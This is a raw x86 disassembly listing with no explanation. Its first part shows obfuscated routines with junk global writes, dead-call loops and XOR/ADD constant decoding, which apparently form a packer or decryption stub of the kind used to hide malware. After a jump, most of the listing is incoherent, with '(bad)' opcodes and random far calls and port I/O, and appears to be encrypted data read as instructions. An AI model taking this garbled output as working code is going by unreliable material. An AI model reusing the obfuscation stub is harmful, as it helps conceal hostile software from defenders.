  4160f0:	xchg   ebx,ecx
  4160f2:	dec    ecx
  4160f3:	dec    ecx
  4160f4:	mov    eax,DWORD PTR [ebp-0x1c]
  4160f7:	imul   eax,ecx
  4160fa:	add    esp,eax
  4160fc:	xchg   edx,eax
  4160fd:	push   eax
  4160fe:	xor    ebx,ebx
  416100:	mov    edx,esp
  416102:	dec    edx
  416103:	inc    ebx
  416104:	add    ebx,DWORD PTR [edx+ebx*1]
  416107:	dec    ebx
  416108:	xor    edx,edx
  41610a:	add    DWORD PTR [ebp-0x10],ebx
  41610d:	pop    ebx
  41610e:	mov    eax,DWORD PTR [ebp-0x10]
  416111:	pop    edi
  416112:	pop    esi
  416113:	pop    ebx
  416114:	leave  
  416115:	ret    0x10
  416118:	push   ebp
  416119:	mov    ebp,esp
  41611b:	push   ecx
  41611c:	mov    DWORD PTR [ebp-0x4],0xf89c85bc
  416123:	and    eax,0x6d5c
  416128:	mov    eax,DWORD PTR [ebp-0x4]
  41612b:	or     DWORD PTR ds:0x42d00c,edx
  416131:	mov    edx,DWORD PTR [ebp+0x10]
  416134:	dec    ecx
  416135:	mov    ecx,0x75108a4
  41613a:	xor    eax,ecx
  41613c:	add    eax,0x3272ec
  416141:	adc    DWORD PTR ds:0x42b00c,0x375
  41614b:	mov    DWORD PTR [edx],eax
  41614d:	sub    DWORD PTR ds:0x42b008,ecx
  416153:	mov    eax,DWORD PTR [ebp+0xc]
  416156:	and    DWORD PTR ds:0x42b014,0x0
  416160:	xor    edx,edx
  416162:	add    edx,DWORD PTR ds:0x42b014
  416168:	inc    edx
  416169:	mov    DWORD PTR ds:0x42b014,edx
  41616f:	cmp    DWORD PTR ds:0x42b014,0xf
  416176:	ja     0x4161cd
  41617c:	jmp    0x4161a6
  416181:	push   DWORD PTR [ebp-0x28]
  416184:	push   DWORD PTR [ebp-0x18]
  416187:	push   0x42b00c
  41618c:	push   0x1f1a
  416191:	push   0x8ba1
  416196:	push   0x2c78
  41619b:	push   0x5355
  4161a0:	call   DWORD PTR ds:0x43001b
  4161a6:	cmp    DWORD PTR ds:0x42b014,0xe
  4161ad:	jne    0x4161c0
  4161b3:	mov    edx,DWORD PTR ds:0x42b014
  4161b9:	inc    edx
  4161ba:	mov    DWORD PTR ds:0x42b014,edx
  4161c0:	cmp    DWORD PTR ds:0x42b014,0x1f
  4161c7:	jb     0x416160
  4161cd:	xor    eax,ecx
  4161cf:	push   esi
  4161d0:	mov    esi,DWORD PTR [ebp+0x10]
  4161d3:	mov    edx,0x3272ec
  4161d8:	add    eax,edx
  4161da:	mov    DWORD PTR [esi+0x4],eax
  4161dd:	mov    eax,DWORD PTR [ebp+0x14]
  4161e0:	mov    esi,DWORD PTR [ebp+0x10]
  4161e3:	mov    DWORD PTR [esi+0x8],eax
  4161e6:	mov    eax,DWORD PTR [ebp+0x18]
  4161e9:	mov    esi,DWORD PTR [ebp+0x10]
  4161ec:	mov    DWORD PTR [esi+0xc],eax
  4161ef:	mov    eax,DWORD PTR [ebp+0x1c]
  4161f2:	mov    esi,DWORD PTR [ebp+0x10]
  4161f5:	mov    DWORD PTR [esi+0x10],eax
  4161f8:	mov    eax,DWORD PTR [ebp+0x8]
  4161fb:	xor    eax,ecx
  4161fd:	add    eax,edx
  4161ff:	pop    esi
  416200:	leave  
  416201:	ret    0x18
  416204:	push   ebp
  416205:	mov    ebp,esp
  416207:	sub    esp,0x9c
  41620d:	movzx  eax,BYTE PTR ds:0x429024
  416214:	sbb    eax,DWORD PTR ds:0x429000
  41621a:	mov    ds:0x429024,eax
  41621f:	mov    ecx,DWORD PTR [ebp+0x8]
  416222:	mov    eax,0x8a94
  416227:	xor    ax,WORD PTR [ecx+0x20]
  41622b:	mov    ecx,0x3b56
  416230:	xor    DWORD PTR ds:0x429008,0x611c
  41623a:	add    ax,cx
  41623d:	movzx  eax,ax
  416240:	mov    DWORD PTR [ebp-0x10],eax
  416243:	and    DWORD PTR ds:0x429014,0xd29
  41624d:	mov    BYTE PTR [ebp-0x1],0x7d
  416251:	adc    ecx,DWORD PTR ds:0x42d004
  416257:	lea    eax,[ebp-0x1]
  41625a:	mov    DWORD PTR ds:0x42b00c,0x12
  416264:	cmp    DWORD PTR ds:0x42b00c,0x0
  41626b:	je     0x4162a3
  416271:	cmp    DWORD PTR ds:0x42b00c,0x17
  416278:	jbe    0x4162a3
  41627e:	jmp    0x416291
  416283:	push   DWORD PTR [ebp-0x28]
  416286:	push   0x84ea
  41628b:	call   DWORD PTR ds:0x430027
  416291:	mov    ecx,DWORD PTR ds:0x42b00c
  416297:	dec    ecx
  416298:	mov    DWORD PTR ds:0x42b00c,ecx
  41629e:	jmp    0x416264
  4162a3:	mov    DWORD PTR [ebp-0xc],eax
  4162a6:	mov    al,BYTE PTR [ebp-0x1]
  4162a9:	sub    DWORD PTR ds:0x42a010,0x238f
  4162b3:	mov    ecx,DWORD PTR [ebp-0xc]
  4162b6:	xor    DWORD PTR ds:0x42a01c,0x42b01c
  4162c0:	xor    al,0x79
  4162c2:	add    DWORD PTR ds:0x42c01c,0x429014
  4162cc:	sub    al,0x3
  4162ce:	add    DWORD PTR ds:0x42c01c,0x2d5e
  4162d8:	mov    BYTE PTR [ecx],al
  4162da:	and    DWORD PTR ds:0x429004,0x0
  4162e4:	xor    eax,eax
  4162e6:	xor    eax,DWORD PTR ds:0x429004
  4162ec:	inc    eax
  4162ed:	mov    ds:0x429004,eax
  4162f2:	cmp    DWORD PTR ds:0x429004,0x6
  4162f9:	jge    0x41633a
  4162ff:	jmp    0x416312
  416304:	push   DWORD PTR [ebp-0x10]
  416307:	push   0x8717
  41630c:	call   DWORD PTR ds:0x43002b
  416312:	cmp    DWORD PTR ds:0x429004,0x5
  416319:	jne    0x41632d
  41631f:	xor    eax,eax
  416321:	xor    eax,DWORD PTR ds:0x429004
  416327:	inc    eax
  416328:	mov    ds:0x429004,eax
  41632d:	cmp    DWORD PTR ds:0x429004,0x11
  416334:	jb     0x4162e4
  41633a:	mov    DWORD PTR [ebp-0x18],0xf89c85b0
  416341:	and    DWORD PTR ds:0x42d014,0x6f44
  41634b:	push   ebx
  41634c:	not    DWORD PTR ds:0x42a010
  416352:	mov    DWORD PTR [ebp-0x8],0xf89c85b1
  416359:	mov    ecx,DWORD PTR [ebp-0x18]
  41635c:	add    DWORD PTR ds:0x429010,0x796f
  416366:	push   esi
  416367:	mov    DWORD PTR ds:0x42a004,0x19
  416371:	cmp    DWORD PTR ds:0x42a004,0x0
  416378:	je     0x4163b7
  41637e:	cmp    DWORD PTR ds:0x42a004,0x28
  416385:	jl     0x4163b7
  41638b:	jmp    0x4163a5
  416390:	push   0x5678
  416395:	push   0x429018
  41639a:	push   0x42f025
  41639f:	call   DWORD PTR ds:0x430033
  4163a5:	mov    esi,DWORD PTR ds:0x42a004
  4163ab:	dec    esi
  4163ac:	mov    DWORD PTR ds:0x42a004,esi
  4163b2:	jmp    0x416371
  4163b7:	mov    eax,0x75108a4
  4163bc:	and    DWORD PTR ds:0x42b01c,0x6a8d
  4163c6:	xor    ecx,eax
  4163c8:	mov    esi,DWORD PTR ds:0x42b000
  4163ce:	xor    DWORD PTR ds:0x42a010,esi
  4163d4:	mov    esi,0x3272ec
  4163d9:	sbb    DWORD PTR ds:0x42a000,0x4a3d
  4163e3:	push   edi
  4163e4:	add    ecx,esi
  4163e6:	mov    DWORD PTR ds:0x42a018,0x89b
  4163f0:	jmp    0x41641e
  4163f5:	mov    DWORD PTR ds:0x42c010,0x3697
  4163ff:	mov    dl,BYTE PTR [ebp-0x1]
  416402:	mov    DWORD PTR ds:0x42d004,0x1aee
  41640c:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  416413:	mov    DWORD PTR ds:0x42b014,0x1f71
  41641d:	inc    ecx
  41641e:	cmp    ecx,0x40
  416421:	mov    DWORD PTR ds:0x429024,0xce6
  41642b:	jb     0x4163f5
  416431:	mov    edx,DWORD PTR [ebp-0x18]
  416434:	xor    edx,eax
  416436:	add    edx,esi
  416438:	jmp    0x4164b8
  41643d:	sub    ecx,edi
  41643f:	mov    edi,DWORD PTR [ebp+0x8]
  416442:	mov    ecx,DWORD PTR ds:0x42c018
  416448:	or     DWORD PTR ds:0x42d010,ecx
  41644e:	mov    ecx,0x8a94
  416453:	xor    cx,WORD PTR [edi+edx*4+0x2]
  416458:	mov    edi,0x3b56
  41645d:	add    DWORD PTR ds:0x42d00c,0x618e
  416467:	add    cx,di
  41646a:	adc    DWORD PTR ds:0x42a000,0x96b
  416474:	movzx  ecx,cx
  416477:	mov    DWORD PTR ds:0x42b004,0x7547
  416481:	mov    DWORD PTR [ebp-0xc],ecx
  416484:	mov    ecx,DWORD PTR [ebp+0x8]
  416487:	movzx  ecx,WORD PTR [ecx+edx*4]
  41648b:	add    DWORD PTR ds:0x42a00c,0x429020
  416495:	xor    ecx,0x8a94
  41649b:	adc    DWORD PTR ds:0x42a01c,0x473e
  4164a5:	add    ecx,edi
  4164a7:	mov    edi,0x26b3
  4164ac:	mov    edi,DWORD PTR [ebp-0xc]
  4164af:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  4164b6:	inc    ecx
  4164b7:	inc    edx
  4164b8:	mov    ecx,DWORD PTR [ebp-0x10]
  4164bb:	cmp    edx,ecx
  4164bd:	jmp    0x418820
  4164c2:	shl    al,cl
  4164c4:	inc    edi
  4164c5:	dec    ecx
  4164c6:	cmp    edi,DWORD PTR [ecx+0x7fc9f3b8]
  4164cc:	push   cs
  4164cd:	mov    eax,0xba0518bb
  4164d2:	pop    ebx
  4164d3:	cmp    BYTE PTR [ebp+0x7a],bh
  4164d6:	xor    BYTE PTR [edi+0x7a],bl
  4164d9:	jp     0x41649c
  4164db:	mov    dl,0xeb
  4164dd:	mov    ds:0xd26f9d86,eax
  4164e2:	call   0x61b10a03
  4164e7:	mov    dh,0x43
  4164e9:	jae    0x416485
  4164eb:	mov    ebx,0x88831730
  4164f0:	push   eax
  4164f1:	mov    es,WORD PTR [ebx]
  4164f3:	dec    esi
  4164f4:	xor    al,bh
  4164f6:	pushf  
  4164f7:	cmp    esi,0x8351a944
  4164fd:	mov    cl,0x44
  4164ff:	fistp  DWORD PTR [ebx-0x43]
  416502:	inc    edi
  416503:	bound  ebp,QWORD PTR [edx]
  416505:	pop    esi
  416506:	adc    bl,cl
  416508:	lea    ecx,[ecx]
  41650a:	es xchg ecx,eax
  41650c:	jmp    0x19198d03
  416511:	rcr    bh,0xe4
  416514:	xor    eax,0x392216b1
  416519:	xchg   esi,eax
  41651a:	cmp    al,0x25
  41651c:	imul   eax,DWORD PTR [edi],0xffffffa8
  41651f:	cmp    DWORD PTR [ebp+edx*2+0x620f0379],ebx
  416526:	push   edi
  416527:	nop
  416528:	test   eax,0xd9932852
  41652d:	mov    es,WORD PTR [esi-0x363c1331]
  416533:	je     0x416570
  416535:	add    BYTE PTR [edx+0x7b26e32d],ah
  41653b:	mov    dl,0xb2
  41653d:	cmc    
  41653e:	int    0x32
  416540:	cmp    eax,ebp
  416542:	push   ecx
  416543:	mov    ebp,0x82608db0
  416548:	pop    ss
  416549:	leave  
  41654a:	ja     0x4165ae
  41654c:	push   ecx
  41654d:	or     eax,DWORD PTR [ebx]
  41654f:	add    ebp,esp
  416551:	neg    dh
  416553:	(bad)  
  416554:	xor    DWORD PTR [ebp+0x6646839],edi
  41655a:	or     al,0x89
  41655c:	jnp    0x4165da
  41655e:	aas    
  41655f:	(bad)
  416562:	int3   
  416563:	dec    esp
  416564:	dec    eax
  416565:	pop    edx
  416566:	sub    eax,0xc87cf431
  41656b:	fadd   QWORD PTR [edi+0x5c]
  41656e:	mov    al,0x28
  416570:	xchg   DWORD PTR [esp+ebx*2-0x7c37c767],edi
  416577:	aaa    
  416578:	cmp    bh,BYTE PTR [esi]
  41657a:	call   0x37f:0x16620e87
  416581:	jb     0x4165f6
  416583:	inc    edx
  416584:	in     eax,0x5c
  416586:	ret    0x6247
  416589:	lods   al,BYTE PTR ds:[esi]
  41658a:	pop    edx
  41658b:	mov    ecx,0xc16ac9ba
  416590:	mul    DWORD PTR ds:[ebp+0x47]
  416594:	adc    edx,DWORD PTR [esi+eax*8-0xe73d09f]
  41659b:	cmp    BYTE PTR [eax-0x4c],bl
  41659e:	xor    esp,DWORD PTR [edx]
  4165a0:	popa   
  4165a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4165a2:	xor    eax,0xa9887774
  4165a7:	je     0x41658c
  4165a9:	add    DWORD PTR [eax-0x63],0x4939033c
  4165b0:	xor    al,0x7f
  4165b2:	loopne 0x4165aa
  4165b4:	or     BYTE PTR [eax],cl
  4165b6:	push   esp
  4165b7:	jp     0x41655f
  4165b9:	jmp    0x42aec21a
  4165be:	pop    ebx
  4165bf:	push   0x58
  4165c1:	(bad)  
  4165c2:	push   edx
  4165c3:	adc    al,0xcb
  4165c5:	mov    ds:0x5edbddcf,al
  4165ca:	aas    
  4165cb:	in     eax,dx
  4165cc:	inc    eax
  4165cd:	mov    al,0xde
  4165cf:	xor    eax,0x843a83f8
  4165d4:	pop    esp
  4165d5:	rcr    BYTE PTR [esi+0x512447c6],1
  4165db:	imul   edi,DWORD PTR [ecx-0x4b385f46],0xffffffe5
  4165e2:	ret    0xe79f
  4165e5:	daa    
  4165e6:	outs   dx,BYTE PTR ds:[esi]
  4165e7:	(bad)  
  4165e8:	push   ss
  4165e9:	dec    eax
  4165ea:	ja     0x41657a
  4165ec:	outs   dx,DWORD PTR ds:[esi]
  4165ed:	cwde   
  4165ee:	sbb    al,0x16
  4165f0:	pop    ecx
  4165f1:	stos   DWORD PTR es:[edi],eax
  4165f2:	retf   
  4165f3:	je     0x41658f
  4165f5:	lds    esp,FWORD PTR [edi+0x13]
  4165f8:	jne    0x416645
  4165fa:	gs lahf 
  4165fc:	pop    esp
  4165fd:	clc    
  4165fe:	dec    edx
  4165ff:	jg     0x416640
  416601:	jnp    0x416659
  416603:	outs   dx,DWORD PTR ds:[esi]
  416604:	aad    0xb1
  416606:	call   FWORD PTR ss:[edx-0x40]
  41660a:	xchg   edx,eax
  41660b:	dec    ecx
  41660c:	mov    eax,ds:0x61d37429
  416611:	(bad)  
  416613:	js     0x416600
  416615:	inc    ebx
  416616:	mov    edx,0xfae57581
  41661b:	xchg   edi,eax
  41661c:	ins    BYTE PTR es:[edi],dx
  41661d:	mov    eax,0x303c4670
  416622:	jae    0x416644
  416624:	in     al,0x52
  416626:	xchg   ebp,eax
  416627:	sub    ecx,eax
  416629:	pop    esi
  41662a:	dec    esp
  41662b:	fsubrp st(1),st
  41662d:	push   edi
  41662e:	fsubr  QWORD PTR ds:0xe550446
  416634:	xor    esp,DWORD PTR [esi-0x7b]
  416637:	loope  0x416612
  416639:	int3   
  41663a:	jp     0x41663f
  41663c:	fst    st(4)
  41663e:	pop    es
  41663f:	cmp    BYTE PTR [edx+ebp*2],0x53
  416643:	pop    ebx
  416644:	fistp  DWORD PTR [esi]
  416646:	xor    al,0xee
  416648:	adc    BYTE PTR [esi+eiz*2],dl
  41664b:	js     0x41663c
  41664d:	into   
  41664e:	xor    eax,0x989d86eb
  416653:	cmp    edx,edx
  416655:	out    0xc,eax
  416657:	lods   al,BYTE PTR ds:[esi]
  416658:	in     eax,dx
  416659:	jmp    0x4f818b4c
  41665e:	and    ch,BYTE PTR [edi+0x3]
  416661:	daa    
  416662:	jns    0x4166d2
  416664:	xor    esp,edx
  416666:	mov    eax,ds:0xa9b6b252
  41666b:	js     0x4166e9
  41666d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41666e:	mov    al,0x60
  416670:	sub    eax,0xb846846c
  416675:	or     al,0x33
  416677:	daa    
  416678:	(bad)  
  416679:	jmp    0xdaa703a0
  41667e:	dec    ebx
  41667f:	es xchg edi,eax
  416681:	cs scas al,BYTE PTR es:[edi]
  416683:	mov    al,0x90
  416685:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416686:	shl    DWORD PTR [esi],cl
  416688:	mov    bh,0xe9
  41668a:	and    BYTE PTR [ebp+0x75c9e4b0],dh
  416690:	cwde   
  416691:	push   ecx
  416692:	or     BYTE PTR [ebx+ebx*8],bh
  416695:	sub    ch,BYTE PTR [ebx-0x2d]
  416698:	sbb    eax,0x1caa1c9f
  41669d:	and    al,0x17
  41669f:	sbb    BYTE PTR [esi-0x76621d0c],ch
  4166a5:	and    DWORD PTR [edx+0x3c3d3dec],ecx
  4166ab:	fisub  DWORD PTR [eax]
  4166ad:	rcr    DWORD PTR [edi+0x2a1669ca],0x4d
  4166b4:	jmp    0x71c51c94
  4166b9:	mov    al,0x6
  4166bb:	push   0xb
  4166bd:	push   cs
  4166be:	and    DWORD PTR [eax],ebp
  4166c0:	pop    esi
  4166c1:	push   eax
  4166c2:	shl    DWORD PTR [esi],cl
  4166c4:	sti    
  4166c5:	cmp    BYTE PTR [esi+0x505904b7],dh
  4166cb:	call   0x1979:0x43ac7a54
  4166d2:	scas   al,BYTE PTR es:[edi]
  4166d3:	popf   
  4166d4:	xor    eax,0x378273c5
  4166d9:	jmp    0x3b74:0xdc82311c
  4166e0:	loop   0x41673c
  4166e2:	and    DWORD PTR [eax-0x50ecf2af],ebp
  4166e8:	idiv   BYTE PTR [ecx]
  4166ea:	jle    0x416677
  4166ec:	addr16 push 0xffffffb5
  4166ef:	add    BYTE PTR [eax+edi*1+0x2d05f28a],dl
  4166f6:	adc    eax,0xaeeb3df2
  4166fb:	add    eax,0x96f4dd2a
  416700:	sbb    ch,BYTE PTR [edx+0x7cb84e98]
  416706:	sub    al,0x4a
  416708:	out    0xd5,eax
  41670a:	xor    edi,DWORD PTR [ecx-0x6f]
  41670d:	sub    BYTE PTR gs:[edi-0x2bdc9e23],al
  416714:	mov    eax,0x1d7895b2
  416719:	push   esi
  41671a:	xchg   ecx,eax
  41671b:	sub    al,0xbc
  41671d:	rol    BYTE PTR [edi-0x6],cl
  416720:	sti    
  416721:	fnstsw WORD PTR [edi+edi*1]
  416724:	dec    ebp
  416725:	dec    DWORD PTR [edx]
  416727:	add    eax,0x58784b8d
  41672c:	push   edx
  41672d:	cmc    
  41672e:	out    dx,al
  41672f:	arpl   WORD PTR [ecx-0x6c88d6f],si
  416735:	jle    0x41677b
  416737:	outs   dx,DWORD PTR ds:[esi]
  416738:	or     DWORD PTR [ecx],ecx
  41673a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41673b:	mov    BYTE PTR [edi+esi*4-0x6a442392],0xd7
  416743:	or     eax,0x2bc6211f
  416748:	push   ss
  416749:	test   DWORD PTR [eax+0x65],edi
  41674c:	mov    al,ds:0x6ed1b3e4
  416751:	mov    eax,ds:0x98d02b77
  416756:	ja     0x41673d
  416758:	jp     0x41679f
  41675a:	sbb    ah,cl
  41675c:	nop
  41675d:	mov    dh,0x23
  41675f:	mov    esi,0x5acf3290
  416764:	aad    0x71
  416766:	jg     0x416718
  416768:	(bad)  
  416769:	xchg   edx,eax
  41676a:	cmp    eax,0xf992e77f
  41676f:	adc    bl,BYTE PTR [ecx-0x476e778b]
  416775:	int    0xc6
  416777:	shr    DWORD PTR [eax-0x2f],0x62
  41677b:	inc    eax
  41677c:	loopne 0x416728
  41677e:	es pushf 
  416780:	xor    eax,0x31bf98cd
  416785:	inc    edi
  416786:	pop    ss
  416787:	arpl   WORD PTR [ebp-0x79],si
  41678a:	popa   
  41678b:	lock xor ebp,DWORD PTR [edx+edi*4]
  41678f:	out    0xc,eax
  416791:	or     eax,0xa53bf911
  416796:	daa    
  416797:	mov    ebp,0x42442530
  41679c:	sbb    al,BYTE PTR [edi-0x3d4e9e2a]
  4167a2:	sub    eax,0xbdd1f199
  4167a7:	xchg   edx,eax
  4167a8:	xor    DWORD PTR [ebp+0x67e34d43],ebp
  4167ae:	call   0x82c0f88e
  4167b3:	add    ecx,0x97b1c000
  4167b9:	sub    BYTE PTR [esi],dh
  4167bb:	mov    dh,BYTE PTR [eax]
  4167bd:	adc    eax,0x5125a9b1
  4167c2:	pop    esi
  4167c3:	or     ebp,0xfffffffa
  4167c6:	add    DWORD PTR [esi+0x5e],edx
  4167c9:	(bad)  
  4167ca:	retf   
  4167cb:	sar    BYTE PTR ds:[esi-0x43],0x18
  4167d0:	adc    eax,0xb8b013c6
  4167d5:	adc    ecx,esp
  4167d7:	sub    ecx,0xffd25bfc
  4167dd:	and    al,0x79
  4167df:	push   esp
  4167e0:	mov    ds:0x1337a407,al
  4167e5:	xchg   DWORD PTR [ecx+ecx*4],eax
  4167e8:	mov    WORD PTR [ebp+0x259dce33],?
  4167ee:	ja     0x4167b9
  4167f0:	add    ebp,DWORD PTR ds:0x878cc3f2
  4167f6:	nop
  4167f7:	xchg   edx,eax
  4167f8:	or     al,0xbe
  4167fa:	sub    DWORD PTR [ecx],esi
  4167fc:	dec    ebp
  4167fd:	mov    al,0xe
  4167ff:	add    ebp,esi
  416801:	mov    ebp,?
  416803:	loope  0x416803
  416805:	ret    
  416806:	mov    esi,0x60da1137
  41680b:	mov    bl,0xb2
  41680d:	mov    eax,ds:0x3521e55f
  416812:	cs jnp 0x41685a
  416815:	call   0x6de3:0xff62cd46
  41681c:	stos   BYTE PTR es:[edi],al
  41681d:	adc    DWORD PTR [ebp-0x25],0xffffffe0
  416821:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416822:	loope  0x416832
  416824:	rol    BYTE PTR [edi+0x43],1
  416827:	mov    BYTE PTR [ebx+0xa3b442c],dh
  41682d:	sti    
  41682e:	pop    ss
  41682f:	cmp    dh,0xe
  416832:	jbe    0x4168a5
  416834:	ins    BYTE PTR es:[edi],dx
  416835:	mov    bh,0xf9
  416837:	push   edx
  416838:	jae    0x416879
  41683a:	xchg   al,dh
  41683c:	cmp    dl,bh
  41683e:	outs   dx,DWORD PTR ds:[esi]
  41683f:	repz scas al,BYTE PTR es:[edi]
  416841:	sbb    ah,al
  416843:	iret   
  416844:	jo     0x4168a7
  416846:	bound  ebx,QWORD PTR [edx+0x13]
  416849:	jmp    FWORD PTR [edx-0x723db033]
  41684f:	pop    ss
  416850:	and    al,0xa7
  416852:	jmp    0x41683e
  416854:	test   DWORD PTR [esp+ebp*2],0xa0138aff
  41685b:	add    eax,0x9cb8e0cb
  416860:	cmp    eax,0x274ce336
  416865:	cdq    
  416866:	adc    ch,cl
  416868:	push   0xaa7e12ab
  41686d:	jl     0x416869
  41686f:	and    ch,BYTE PTR [eax]
  416871:	pop    esi
  416872:	sti    
  416873:	xchg   DWORD PTR [edx-0x58],edi
  416876:	sub    al,0xa3
  416878:	xchg   esi,eax
  416879:	mov    cl,BYTE PTR [ebx+0x55602628]
  41687f:	sub    dl,cl
  416881:	adc    al,0xad
  416883:	push   cs
  416884:	mov    ecx,0x5681d058
  416889:	out    dx,eax
  41688a:	mov    ecx,eax
  41688c:	sub    ecx,edi
  41688e:	mov    eax,ds:0x55703b1d
  416893:	inc    eax
  416894:	loopne 0x4168fd
  416896:	(bad)  
  41689a:	inc    esi
  41689b:	(bad)  
  41689c:	cwde   
  41689d:	dec    ah
  41689f:	sbb    al,0x6c
  4168a1:	repnz push esp
  4168a3:	(bad)  
  4168a4:	and    cl,BYTE PTR [ebp-0x2f]
  4168a7:	push   cx
  4168a9:	and    eax,0xb6fec17b
  4168ae:	fs (bad) 
  4168b0:	in     al,dx
  4168b1:	sub    ebp,DWORD PTR [ebx-0x9]
  4168b4:	cmc    
  4168b5:	pop    ebx
  4168b6:	ds add eax,0xd940bc9f
  4168bc:	das    
  4168bd:	bound  ebp,QWORD PTR [ecx-0x29bcd437]
  4168c3:	fs out dx,al
  4168c5:	mov    edx,0x827826f7
  4168ca:	mov    WORD PTR [edi+eax*2-0x69],cs
  4168ce:	adc    eax,0x7b7428e2
  4168d3:	jae    0x416941
  4168d5:	jmp    0xf1f7:0xe18afdd3
  4168dc:	pop    ds
  4168dd:	outs   dx,DWORD PTR ds:[esi]
  4168de:	das    
  4168df:	push   ebx
  4168e0:	mov    dh,0xed
  4168e2:	sbb    al,0x37
  4168e4:	outs   dx,BYTE PTR ds:[esi]
  4168e5:	xchg   ebp,eax
  4168e6:	pop    ecx
  4168e7:	sub    edi,ebp
  4168e9:	hlt    
  4168ea:	mov    bl,0xc1
  4168ec:	jo     0x41696b
  4168ee:	outs   dx,DWORD PTR ds:[esi]
  4168ef:	add    ch,BYTE PTR [ecx-0x600869f6]
  4168f5:	loop   0x41689d
  4168f7:	ja     0x41687c
  4168f9:	mov    eax,ds:0xd19fa61
  4168fe:	cmp    ch,BYTE PTR [ebp+edx*2-0x29]
  416902:	and    al,0xfa
  416904:	add    al,0xd9
  416906:	push   ds
  416907:	fwait
  416908:	hlt    
  416909:	xor    al,0x6
  41690b:	(bad)  
  41690e:	mov    cl,0x3e
  416910:	or     ecx,0x41
  416913:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416914:	and    DWORD PTR [ebx+0x1d],ebx
  416917:	and    al,0x59
  416919:	outs   dx,DWORD PTR ds:[esi]
  41691a:	jb     0x416930
  41691c:	rcl    BYTE PTR [ebp+0x55],1
  41691f:	mov    eax,0x40f0f243
  416924:	shl    DWORD PTR [ebx+0x7a],1
  416927:	jae    0x416968
  416929:	jmp    0x47b96bdf
  41692e:	mov    dl,0xfa
  416930:	gs es xchg esi,eax
  416933:	ficom  DWORD PTR [ecx]
  416935:	mov    cl,0x15
  416937:	sbb    al,0xf1
  416939:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41693a:	xchg   ebx,eax
  41693b:	addr16 xor al,0xed
  41693e:	pushf  
  41693f:	ss dec esi
  416941:	xor    DWORD PTR [ebp+eiz*4+0x25],edx
  416945:	and    al,ah
  416947:	cmc    
  416948:	neg    BYTE PTR [ebp-0x5236b7fa]
  41694e:	push   edi
  41694f:	daa    
  416950:	(bad)
  416953:	push   ebp
  416954:	xor    bh,bh
  416956:	jl     0x41692a
  416958:	push   esi
  416959:	push   ecx
  41695a:	push   ebp
  41695b:	cmp    BYTE PTR [edx],cl
  41695d:	out    dx,al
  41695e:	xchg   esp,eax
  41695f:	test   edi,edi
  416961:	push   ebx
  416962:	dec    edx
  416963:	bound  esp,QWORD PTR ds:0x67bc5f8c
  416969:	inc    ebx
  41696a:	push   edi
  41696b:	fmul   st,st(7)
  41696d:	pop    es
  41696e:	retf   
  41696f:	lock push esi
  416971:	dec    edi
  416972:	outs   dx,DWORD PTR ds:[esi]
  416973:	add    esi,DWORD PTR [eax]
  416975:	ficom  DWORD PTR [edx+0x7d]
  416978:	(bad)  
  416979:	aas    
  41697a:	adc    al,0xe8
  41697c:	dec    ebx
  41697d:	mov    al,ds:0xc1a20e66
  416982:	xchg   ebp,eax
  416983:	adc    ch,dl
  416985:	xchg   edx,eax
  416986:	outs   dx,DWORD PTR ds:[esi]
  416987:	dec    esp
  416988:	dec    eax
  416989:	or     eax,0xd3d8de0c
  41698e:	scas   eax,DWORD PTR es:[edi]
  41698f:	mov    ds:0xb4ba8815,ax
  416995:	push   ebx
  416996:	jle    0x4169c8
  416998:	je     0x4169c6
  41699a:	mov    gs,WORD PTR gs:[esi]
  41699d:	fild   QWORD PTR [edi-0x3b17ed2d]
  4169a3:	shr    ebp,0xce
  4169a6:	lods   al,BYTE PTR ds:[esi]
  4169a7:	xor    BYTE PTR [esi],0x3b
  4169aa:	lahf   
  4169ab:	push   cs
  4169ac:	adc    al,0x95
  4169ae:	fistp  DWORD PTR [ecx]
  4169b0:	or     eax,0xa7d845c0
  4169b5:	sar    DWORD PTR [ebx+0x14ad586c],1
  4169bb:	xchg   ebx,eax
  4169bc:	pop    ds
  4169bd:	out    0x69,al
  4169bf:	cmp    ah,0xe1
  4169c2:	out    0xba,eax
  4169c4:	inc    esp
  4169c5:	push   ss
  4169c6:	es lahf 
  4169c8:	jge    0x4169f3
  4169ca:	lahf   
  4169cb:	mov    ebx,0x1be970c1
  4169d0:	or     al,0xd6
  4169d2:	adc    edi,esp
  4169d4:	xchg   ah,cl
  4169d6:	std    
  4169d7:	scas   eax,DWORD PTR es:[di]
  4169d9:	xor    ebp,DWORD PTR [esi-0x7e]
  4169dc:	lea    edx,[esi]
  4169de:	jne    0x416a49
  4169e0:	pop    ecx
  4169e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169e2:	pop    es
  4169e3:	repz test ebx,esi
  4169e6:	or     dh,ch
  4169e8:	lahf   
  4169e9:	and    bl,BYTE PTR [edi+eax*8-0x37aff31d]
  4169f0:	add    al,0xd2
  4169f2:	outs   dx,DWORD PTR ds:[esi]
  4169f3:	sahf   
  4169f4:	lods   eax,DWORD PTR ds:[esi]
  4169f5:	div    BYTE PTR [esi]
  4169f7:	out    0x75,al
  4169f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169fa:	aam    0x9c
  4169fc:	inc    eax
  4169fd:	and    eax,0x6f0b0d56
  416a02:	shl    esi,cl
  416a04:	mov    dl,0xd0
  416a06:	sub    BYTE PTR [esi-0x3ec4f761],ah
  416a0c:	pop    ss
  416a0d:	leave  
  416a0e:	lahf   
  416a0f:	cmc    
  416a10:	sbb    DWORD PTR [eax+edi*1-0x4e],ebx
  416a14:	xchg   BYTE PTR [ebp+0x66],cl
  416a17:	ins    DWORD PTR es:[edi],dx
  416a18:	mov    ah,0xfd
  416a1a:	jmp    0x416a56
  416a1c:	dec    esi
  416a1d:	or     al,0xfd
  416a1f:	or     eax,eax
  416a21:	ret    
  416a22:	imul   ecx,DWORD PTR [esi],0xffffffe9
  416a25:	sbb    eax,0x2d8d100d
  416a2a:	ins    BYTE PTR es:[edi],dx
  416a2b:	cwde   
  416a2c:	pop    ebx
